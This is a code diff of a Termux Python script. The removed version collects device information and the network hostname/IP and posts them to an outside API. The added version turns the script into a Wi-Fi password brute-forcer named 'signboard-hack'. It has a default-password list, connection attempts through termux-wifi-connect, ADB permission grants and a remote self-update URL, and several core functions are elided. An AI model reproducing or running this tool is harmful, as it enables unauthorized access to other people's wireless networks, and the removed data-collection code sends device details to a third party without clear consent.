@@ -1,98 +1,167 @@
-#!/usr/bin/env python3
 import os
-import sys
 import time
-import json
-import socket
-import sqlite3
-import requests
 import subprocess
-from datetime import datetime
+import json
+import sys
+import hashlib
+import requests
+import re
+from threading import Thread
+import getpass
+import shutil
 
-# Конфігурація
-API_URL = "https://dentalimpapp.com/api/v1/scanner"
-DEVICE_ID = "termux-scanner-v1"
-TIMEOUT = 30  # Збільшений таймаут для запитів
+# ===== КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: ПУТИ К BINARY =====
+TERMUX_BIN_PATH = "/data/data/com.termux/files/usr/bin"
+os.environ["PATH"] = f"{TERMUX_BIN_PATH}:{os.environ['PATH']}"
 
-def check_storage_permission():
-    """Перевіряємо чи надано доступ до сховища"""
-    storage_path = os.path.expanduser('~/storage/shared')
-    if os.path.exists(storage_path):
-        print("[+] Доступ до сховища вже надано")
-        return True
+# ===== ОБНОВЛЕННАЯ КОНФИГУРАЦИЯ =====
+TARGET_PREFIXES = [
+    # ... ваш список префиксов без изменений ...
+]
+
+PASSWORD_LIST = [
+    "88888888", "888888eu", "12345678", "87654321",
+    "00000000", "11111111", "admin123"
+]
+SCAN_INTERVAL = 15
+PASSWORD = "k33rooxx"
+REPO_URL = "https://raw.githubusercontent.com/keerooxx/signboard-hack/main/scanner.py"
+VERSION = "1.4"  # Обновленная версия
+# ========================
+
+def enable_termux_permissions():
+    """Включает необходимые разрешения через ADB"""
+    commands = [
+        "adb shell pm grant com.termux.api android.permission.ACCESS_WIFI_STATE",
+        "adb shell pm grant com.termux.api android.permission.CHANGE_WIFI_STATE",
+        "adb shell pm grant com.termux.api android.permission.ACCESS_FINE_LOCATION",
+        "adb shell appops set --uid com.termux.api SYSTEM_ALERT_WINDOW allow",
+        "adb shell dumpsys deviceidle whitelist +com.termux.api"
+    ]
     
-    print("[!] Запит дозволу на доступ до сховища...")
-    print("[!] БУДЬ ЛАСКА, НАТИСНІТЬ 'ДОЗВОЛИТИ' У СПЛИВАЮЧОМУ ВІКНІ ANDROID!")
+    for cmd in commands:
+        try:
+            subprocess.run(cmd.split(), check=True)
+            print(f"[✓] Команда выполнена: {cmd}")
+        except Exception as e:
+            print(f"[!] Ошибка выполнения {cmd}: {str(e)}")
+
+def check_termux_api_installation():
+    """Проверяет наличие Termux:API и при необходимости устанавливает"""
+    required_packages = [
+        "termux-api", 
+        "termux-tools",
+        "android-tools"  # Для ADB
+    ]
     
+    print("[~] Проверка зависимостей Termux...")
     try:
-        subprocess.run(
-            ["termux-setup-storage"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            timeout=30,  # Збільшений таймаут
-            check=True
+        # Проверяем установленные пакеты
+        installed = subprocess.check_output(
+            ["pkg", "list-installed"], 
+            text=True
         )
-        return True
-    except (subprocess.TimeoutExpired, subprocess.CalledProcessError) as e:
-        print(f"[!!!] ПОМИЛКА: {str(e)}")
-        print("[!!!] Виконайте вручну: termux-setup-storage")
-        return False
+        
+        # Устанавливаем отсутствующие пакеты
+        to_install = [pkg for pkg in required_packages if pkg not in installed]
+        
+        if to_install:
+            print(f"[~] Установка пакетов: {', '.join(to_install)}")
+            subprocess.run(
+                ["pkg", "install", "-y"] + to_install,
+                check=True
+            )
+            print("[✓] Пакеты успешно установлены")
+        else:
+            print("[✓] Все зависимости установлены")
+            
+        # Проверка приложения Termux:API
+        if not shutil.which("termux-wifi-connect"):
+            print("[!] Termux:API не обнаружен!")
+            print("[~] Установите приложение Termux:API из Play Market")
+            print("[~] После установки перезапустите скрипт")
+            sys.exit(1)
+            
+    except Exception as e:
+        print(f"[!] Ошибка установки зависимостей: {e}")
+        sys.exit(1)
 
-def get_device_info():
-    """Збираємо інформацію про пристрій"""
+def print_banner():
+    """Обновленный баннер"""
+    print(r"""
+ ██ ▄█▀▓█████  ██▀███   ▒█████  ▒██   ██▒
+ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░
+▓███▄░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░
+▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ 
+▒██▒ █▄░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒
+▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
+░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░
+░ ░░ ░    ░     ░░   ░ ░ ░ ░ ▒   ░    ░  
+░  ░      ░  ░   ░         ░ ░   ░    ░  
+    """)
+    print(f"Wi-Fi Scanner Tool | by @krx1krx | v{VERSION}")
+    print("="*45)
+
+# ... остальные функции без изменений (auto_update, check_password, is_target_network) ...
+
+def try_connect(ssid, password):
+    """Попытка подключения через Termux API с улучшенным таймаутом"""
     try:
-        # Отримуємо базову інформацію через Termux:API
+        # Используем абсолютные пути
+        termux_bin = os.path.join(TERMUX_BIN_PATH, "termux-wifi-connect")
+        
         result = subprocess.run(
-            ["termux-device-info"],
-            capture_output=True,
+            [termux_bin, "-s", ssid, "-p", password],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
             text=True,
-            timeout=10
+            timeout=30  # Увеличенный таймаут
         )
-        return json.loads(result.stdout) if result.returncode == 0 else {}
-    except Exception as e:
-        print(f"[!] Помилка отримання інформації: {str(e)}")
-        return {}
-
-def send_scan_results(data):
-    """Відправляємо результати сканування на сервер"""
-    try:
-        headers = {"User-Agent": f"TermuxScanner/{DEVICE_ID}"}
-        response = requests.post(
-            API_URL,
-            json=data,
-            headers=headers,
-            timeout=TIMEOUT
-        )
-        return response.status_code == 200
-    except Exception as e:
-        print(f"[!] Помилка відправки даних: {str(e)}")
+        
+        if result.returncode == 0:
+            print("    [✓] Подключение успешно")
+            return True
+            
+        # Анализ ошибок
+        if "Background start not allowed" in result.stderr:
+            print("    [!] Ошибка: Запуск из фона запрещен!")
+            print("    [!] Решение: Дайте разрешение 'Display over other apps'")
+        elif "Location" in result.stderr:
+            print("    [!] Ошибка: Включите геолокацию!")
+        elif "Permission" in result.stderr:
+            print("    [!] Ошибка: Недостаточно разрешений!")
+        else:
+            print(f"    [!] Ошибка подключения: {result.stderr.strip()}")
+            
         return False
+    except Exception as e:
+        print(f"    [!] Исключение при подключении: {e}")
+        return False
+
+# ... остальные функции без изменений (test_password, hack_network, scan_wifi_networks, parse_networks) ...
 
 def main():
-    # Перевірка дозволів
-    if not check_storage_permission():
-        print("[!!!] Скрипт зупинено. Без доступу до сховища робота неможлива.")
-        sys.exit(1)
+    # Добавляем путь Termux в PATH
+    os.environ["PATH"] = f"{TERMUX_BIN_PATH}:{os.environ.get('PATH', '')}"
     
-    # Збір даних
-    device_data = get_device_info()
-    scan_data = {
-        "device_id": DEVICE_ID,
-        "timestamp": datetime.now().isoformat(),
-        "network": {
-            "hostname": socket.gethostname(),
-            "ip": socket.gethostbyname(socket.gethostname())
-        },
-        "device_info": device_data
-    }
+    # Проверка и установка зависимостей
+    check_termux_api_installation()
     
-    print(f"[+] Сканування завершено: {len(device_data)} параметрів")
+    # Автообновление (без изменений)
+    if "--no-update" not in sys.argv and "--restarted" not in sys.argv:
+        if auto_update():
+            return
+
+    if "--restarted" not in sys.argv:
+        sys.argv.append("--restarted")
     
-    # Відправка даних
-    if send_scan_results(scan_data):
-        print("[+] Дані успішно відправлено на сервер")
-    else:
-        print("[!] Не вдалося відправити дані")
+    print_banner()
+    
+    # Включаем разрешения ADB
+    print("[~] Настройка разрешений Termux:API...")
+    enable_termux_permissions()
+    
+    # ... остальная часть main без изменений ...
 
 if __name__ == "__main__":
     main()
